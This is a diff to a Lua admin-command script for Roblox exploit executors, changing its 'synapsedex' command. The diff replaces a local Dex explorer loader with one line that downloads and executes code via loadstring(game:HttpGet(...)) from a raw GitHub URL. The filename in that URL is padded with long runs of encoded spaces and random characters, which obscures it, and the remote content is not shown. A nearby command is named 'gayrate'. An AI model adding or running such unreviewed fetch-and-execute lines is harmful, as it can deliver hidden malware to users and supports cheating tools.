@@ -4628,63 +4628,7 @@ cmd.add({"getuserfromid","guid"},{"getuserfromid (guid)","Copy a user's Username
 end)
 
 cmd.add({"synapsedex","sdex"},{"synapsedex (sdex)","Loads SynapseX's dex explorer"},function()
-	local rng=Random.new()
-
-	local charset={}
-	for i=48,57 do table.insert(charset,string.char(i)) end
-	for i=65,90 do table.insert(charset,string.char(i)) end
-	for i=97,122 do table.insert(charset,string.char(i)) end
-	function RandomCharacters(length)
-		if length>0 then
-			return RandomCharacters(length-1)..charset[rng:NextInteger(1,#charset)]
-		else
-			return ""
-		end
-	end
-
-	local Dex=game:GetObjects("rbxassetid://9553291002")[1]
-	Dex.Name=RandomCharacters(rng:NextInteger(5,20))
-	Dex.Parent=COREGUI
-
-	function Load(Obj,Url)
-		function GiveOwnGlobals(Func,Script)
-			local Fenv={}
-			local RealFenv={script=Script}
-			local FenvMt={}
-			FenvMt.__index=function(a,b)
-				if RealFenv[b]==nil then
-					return getfenv()[b]
-				else
-					return RealFenv[b]
-				end
-			end
-			FenvMt.__newindex=function(a,b,c)
-				if RealFenv[b]==nil then
-					getfenv()[b]=c
-				else
-					RealFenv[b]=c
-				end
-			end
-			setmetatable(Fenv,FenvMt)
-			setfenv(Func,Fenv)
-			return Func
-		end
-
-		function LoadScripts(Script)
-			if Script.ClassName=="Script" or Script.ClassName=="LocalScript" then
-				spawn(function()
-					GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()),Script)()
-				end)
-			end
-			for i,v in pairs(Script:GetChildren()) do
-				LoadScripts(v)
-			end
-		end
-
-		LoadScripts(Obj)
-	end
-
-	Load(Dex)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/sKjFUAuuHX435Nr3PSYNAPSE_%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%C2%A0DEX_%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20_.18604795390eEB165EU9w2XhQ6TeJycJs2QJy5V676b4oV8EeT6lI1.lua.txt"))()
 end)
 
 cmd.add({"gayrate"},{"gayrate <player>","Gay scale of a player"},function(...)
